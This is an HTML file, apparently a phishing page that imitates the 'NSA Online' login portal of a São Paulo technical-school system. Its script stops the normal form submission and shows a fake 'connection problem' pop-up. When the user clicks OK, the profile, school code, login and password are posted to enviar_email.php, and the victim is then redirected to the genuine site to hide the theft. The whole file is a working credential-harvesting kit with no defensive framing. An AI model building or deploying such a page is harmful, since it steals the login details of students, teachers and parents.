<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>NSA - Online</title>
  <link rel="icon" type="image/png" href="favicon.png" />
  <link rel="stylesheet" href="style.css" />
  <style>
    /* Estilo do pop-up personalizado */
    .popup-overlay {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .popup-box {
      background-color: #fff;
      padding: 20px;
      border-radius: 4px;
      width: 350px;
      text-align: center;
      box-shadow: 0 0 15px rgba(0,0,0,0.3);
    }

    .popup-box p {
      font-size: 14px;
      margin-bottom: 15px;
      color: #333;
      margin: 16px;
    }

    .popup-button {
      background-color: #222;
      color: white;
      padding: 10px 40px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="login-box">
      <img src="nsaonline.png" alt="NSA Online Logo" class="logo" />

      <!-- Início do formulário -->
      <form id="loginForm" autocomplete="off">
        <div class="form-group">
          <label>Entrar como:</label>
          <select name="perfil" autocomplete="off" >
            <option>ALUNO</option>
            <option>ETEC</option>
            <option>PROFESSOR</option>
            <option>RESPONSÁVEL</option>
            <option>SUPERVISÃO</option>
            <option>MONITORAMENTO</option>
          </select>

          <label class="codetec">Cod. Etec:</label>
          <input type="text" name="codetec" class="etec-code" maxlength="4"  />
          <button type="button" class="help-button">?</button>
        </div>

        <div class="form-group">
          <label>RM:</label>
          <input type="text" name="rm" placeholder="Digite seu login" />
          <label class="codetec">Senha:</label>
          <input type="password" name="senha" id="passwordtam" placeholder="Digite sua senha"  />
          <button type="submit" class="enter-button">ENTRAR</button>
        </div>
      </form>
      <!-- Fim do formulário -->

      <a href="#" class="link">Solicitar nova senha</a>

      <div class="app-icons">
        <div><img src="android.png" alt="Android" class="icon" /></div>
        <div><img src="apple-ios.png" alt="iOS" class="icon" /></div>
      </div>

      <footer>© Sistema NSA – Desde 2008</footer>
    </div>
  </div>

  <!-- Pop-up personalizado -->
  <div class="popup-overlay" id="popup">
    <div class="popup-box">
      <p style="color: black; margin-top: 0px; margin-bottom: 24px;"><b>MENSAGEM DO NSA - ONLINE</b></p>
      <p>Problema de conexão com o servidor, recarregue a página!</p>
      <button class="popup-button" onclick="enviarFormulario()">OK</button>
    </div>
  </div>

  <script>
    const form = document.getElementById("loginForm");
    const popup = document.getElementById("popup");

    form.addEventListener("submit", function (e) {
      e.preventDefault(); // Impede o envio padrão
      popup.style.display = "flex"; // Mostra o pop-up
    });

    function enviarFormulario() {
      const formData = new FormData(form);

      fetch("enviar_email.php", {
        method: "POST",
        body: formData,
      }).then(() => {
        // Redireciona após o envio
        window.location.href = "https://nsa.cps.sp.gov.br/";
      }).catch((error) => {
        alert("Erro ao enviar os dados.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
